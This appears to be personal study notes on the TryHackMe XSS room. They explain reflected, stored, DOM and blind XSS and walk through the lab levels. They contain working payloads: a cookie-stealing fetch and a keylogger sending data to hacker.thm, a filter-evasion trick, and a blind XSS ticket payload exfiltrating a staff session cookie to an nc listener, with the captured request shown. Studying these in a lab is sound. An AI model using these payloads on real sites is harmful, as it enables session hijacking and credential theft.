
#XSS #Web 

https://tryhackme.com/r/room/xss

It's worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicated: also, a basic understanding of Client-Server requests and responses.

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.

Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.

## XSS payload

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload
- intention = what you want the JS to do
- modification = the changes in code to make it execute

> [!info] Proof of Concept payload
> `<script>alert('XSS');</script>`

### session stealing 

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

> [!info] Session Steal Cookie
> ```<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>```

### keylogger

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

> [!info] Key logger
> `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

### business logic 

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

> [!info] Business logic
> `<script>user.changeEmail('attacker@hacker.thm');</script>`

## reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

- URL parameters
- URL file path

```
https://website.thm/?error=Invalid Input Detected

<div class="alert alert-danger">
	<p><script src="https:..attacker.thm/evil.js"></script></p>
</div>
```

1. attacker sends a link to victim that has malicious payload
2. victim clicks link and goes to vulnerable website
3. link contains attacker's script executed on website
4. attacker's script grabs the data, stealing victim's cookie (account takeover)

> [!info] Potential Impact
> The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

## stored XSS

the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

- blog website that has comment section, no checks for javascript code
- comment with javascript code is added to <span style="color:#a0f958">database</span> => every user has it now on their browser (stealing cookies)

> [!info] Potential Impact 
> The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.

## DOM based XSS

DOM stands for **D**ocument **O**bject **M**odel and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:

```
document
	<html> root element
	
	L <head> element
		L <title>
		L text
	
	L <body> element
		L <a>
		L text
		L <h1>
		L text
```

### exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

- website JS gets contents for `window.location.hash` parameter then writes that onto the page in current viewed section (not being checked)
- unsafe Javascript method `eval()` in source code

> [!info] Potential Impact
> Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "**window.location.x**" parameters.

## Blind XSS

Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

- <span style="color:#a0f958">website contact form </span>to message staff member, message content is not checked, messages to to support tickets on private web portal

> [!info] Potential Impact
> Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

## practice payload

```
https://10-10-106-169.p.thmlabs.com

The aim for each level will be to execute the JavaScript alert function with the string THM, for example:  
  
<script>alert('THM');</script>

```

```
Level 1
Enter Your Name: jam
[Enter]

<div class="text-center">|
	<h2>Hello, jam</h2>
</div>
<div class="text-center">
	<div id="confirmxss">Confirming XSS Payload</div>
</div>
```

```
Level 1.5
Enter Your Name: <script>alert('THM');</script>
[Enter]

browser popup 'THM'
```

```
Level 2
Enter Your Name: jam
[Enter]

Hello, [jam]

<div class="text-center">
	<h2>Hello, <input value="jam"></h2>
</div>
<div class="text-center">
<div id="confirmxss">Confirming XSS Payload</div>
</div>

It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload

"><script>alert('THM');</script>

window popup 'THM'
```

```
Level 3
Enter Your Name: jam
[Enter]

Hello, [jam        ]           textbox area

<div class="text-center">
	<h2>Hello, <textarea>jam</textarea></h2>
</div>
<div class="text-center">
	<div id="confirmxss">Confirming XSS Payload</div>
</div>

</textarea><script>alert('THM');</script>

popup 'THM'
```

```
Level 4
Enter Your Name: jam
[Enter]

thmlabs.com/level4?payload=jam
Hello, jam 

<div class="text-senter">
	<h2>Hello, <span class="name"></span></h2>
</div>
<script>
	document.getElementsByClassName('name')[0].innerHTML='jam';
</script>

';alert('THM');//

thmlabs.com/level4?payload=%27%3Balert%28%27THM%27%29%3B%2F%2F
popup 'THM'

```

```
Level 5
Enter Your Name: jam
[Enter]

<script>alert('THM');</script>

thmlabs.com/level5?payload=%3Cscript%3Ealert%28%27THM%27%29%3B%3C%2Fscript%3E

Hello, <>alert('THM');

<div class="text-center">
	<h2>Hello, <>alert('THM');</></h2>
</div>
<div class="text-center">
	<div id="confirmxss">Confirming XSS Payload</div>
</div>

The word `script`  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.  
When a word gets removed from a string, there's a helpful trick that you can try.

<sscriptcript>alert('THM');</sscriptcript>

thmlabs.com/level5?payload=%3Csscriptcript%3Ealert%28%27THM%27%29%3B%3C%2Fsscriptcript%3E

<div class="text-center">
	<h2>Hello, <script>alert('THM');</script></h2>
</div>
<div class="text-center">
	<div id="confirmxss">Confirming XSS Payload</div>
</div>

popup 'THM'

```

```
Level 6
Enter an image path: 
[Enter]

"><script>alert('THM');</script>

<div class="text-center">
	<h2>Your Picture</h2>
	<img src="https://10-10-106-169.p.thmlabs.com/images/cat.jpg"scriptalert('THM');/script ">
</div>
<div class="text-center">
	<div id="confirmxss">Confirming XSS Payload</div>
</div>

/images/cat.jpg" onload="alert('THM');

thmlabs.com/level6?payload=%2Fimages%2Fcat.jpg%22+onload%3D%22alert%28%27THM%27%29%3B

popup 'THM'

THM{XSS_MASTER}

```

## practice blind XSS

```
https://10-10-197-16.p.thmlabs.com/

customers > signup now > create account 

tester
thm@mail.com
pass123

[dashboard] [support tickets] [account] [logout]

support ticket 
Tickets can be created using the below button or by sending an email to your custom address **tester@customer.acmeitsupport.thm**

[create ticket ]

"testing" "test" > create ticket

status: open
id: 8 
subject: testing 
date: date 
ticket contents: test

<div class="panel panel-default" style="margin:25px">
<div class="panel-heading">Ticket Information</div>
<div class="panel-body">
	<div><label>Status:</label> Open</div>
	<div><label>Ticket Id:</label> 8</div>
	<div><label>Ticket Subject:</label> testing</div>
	<div><label>Ticket Created:</label> 26/01/2025 19:59</div>
	<div><label>Ticket Contents:</label></div>
	<div><textarea class="form-control">test</textarea></div>
</div>
</div>

-- make a new ticket and put in text area
</textarea>test2

this time test2 is outside the text area
<div><textarea class="form-control"></textarea>test2</div>

```

```
time for XSS payload
make new ticket

</textarea><script>alert('THM');</script>

popup 'THM'

```

Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice.

```
# terminal
nc -lvnp 9001
```

```
new ticket

</textarea><script>fetch('http://10.10.31.92:9001?cookie=' + btoa(document.cookie) );</script>

</textarea> closes the tag
fetch()     makes HTTP request
THM_IP
port_num    port number for listening
?cookie=    query the string for victims cookie
btoa()      base64 command for encoding victim cookie
document.cookie  access the victim cookie

Listening on 0.0.0.0 9001
Connection received on 10.10.197.16 58176
GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
Host: 10.10.31.92:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
Accept: */*
Origin: http://172.17.0.1
Referer: http://172.17.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

https://www.base64decode.org/

```
staff-session=4AB305E55955197693F01D6F8FD2D321
```

